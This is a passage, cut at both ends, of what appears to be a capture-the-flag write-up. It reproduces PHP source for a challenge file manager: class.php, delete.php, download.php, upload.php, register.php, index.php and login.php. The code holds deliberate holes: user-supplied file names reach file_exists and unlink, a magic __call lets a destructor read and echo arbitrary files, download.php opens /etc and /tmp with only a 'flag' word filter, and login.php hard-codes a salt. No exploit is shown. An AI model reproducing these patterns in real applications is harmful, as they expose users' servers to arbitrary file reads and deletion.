class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line">        <span class="comment">//删除 ..和. 防止目录遍历</span></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>); </span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>); </span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="delete-php"><code>delete.php</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="download-php"><code>download.php</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);<span class="comment">//只有网站目录和/etc /tmp可以操作</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="upload-php"><code>upload.php</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$pos</span> = <span class="title function_ invoke__">strrpos</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>, <span class="number">0</span>, <span class="variable">$pos</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$fileext</span> = <span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;image/gif&#x27;</span>:</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;image/jpeg&#x27;</span>:</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;image/png&#x27;</span>:</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Only gif/jpg/png allowed&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$dst</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>] . <span class="variable">$filename</span> . <span class="variable">$fileext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dst</span>);</span><br><span class="line">        <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invaild filename&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="register-php"><code>register.php</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    ......(html css)</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">20</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$u</span>-&gt;<span class="title function_ invoke__">add_user</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;login.php?register&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;此用户名已被使用&#x27;, &#x27;warning&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;请输入有效用户名和密码&#x27;, &#x27;warning&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="index-php"><code>index.php</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    ...(html css)</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Name</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Size</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="login-php"><code>login.php</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    ...(html css)</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;register&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;注册成功&#x27;, &#x27;info&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">20</span> &amp;&amp; <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">verify_user</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$sandbox</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">sha1</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot;sftUahRiTz&quot;</span>) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$sandbox</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span 